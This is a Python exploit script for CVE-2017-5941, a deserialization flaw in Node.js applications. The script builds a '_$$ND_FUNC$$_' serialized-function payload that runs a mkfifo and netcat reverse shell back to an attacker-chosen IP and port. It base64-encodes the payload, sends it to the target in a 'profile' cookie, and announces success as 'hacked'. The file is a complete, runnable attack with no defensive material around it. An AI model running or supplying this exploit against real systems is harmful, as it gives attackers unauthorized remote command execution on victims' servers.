import argparse
import requests
import sys
import base64
from log_colors import *

# CVE-2017-5941
# node.js express deserialization RCE
class CVE2017_5941:
    
    def __init__(self, url, lhost, lport):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    # char encode
    def enc(self, string):
        enc = ''
        for c in string:
            enc = enc + "," + str(ord(c))
        return enc[1:]

    # preapare payload
    def prepare_payload(self):
        print (LogColors.BLUE + 'prepare payload...' + LogColors.ENDC)
        payload = '{"rce":"_$$ND_FUNC$$_function ()'
        payload += "{require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1"
        payload += "|nc {} {} >/tmp/f', ".format(self.lhost, self.lport)
        payload += 'function(error, stdout, stderr) { console.log(stdout) });}()"}"'
        print (LogColors.YELLOW + payload + LogColors.ENDC)
        payload = base64.b64encode(payload.encode()).decode('utf-8')
        return payload

    # send malicious JSON to target host
    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        payload = self.prepare_payload()
        cookies = {"profile" : payload}
        try:
            r = self.session.get(self.url, cookies = cookies, verify = False)
        except Exception as e:
            print (LogColors.RED + "failed to create shell :(" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successfully exploit. hacked :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target ip/host")
    parser.add_argument('-I','--ip', required = True, help = "local host rev shell")
    parser.add_argument('-P','--port', required = True, help = "local port rev shell")
    args = vars(parser.parse_args())
    cve = CVE2017_5941(args['target'], args['ip'], args['port'])
    cve.exploit()

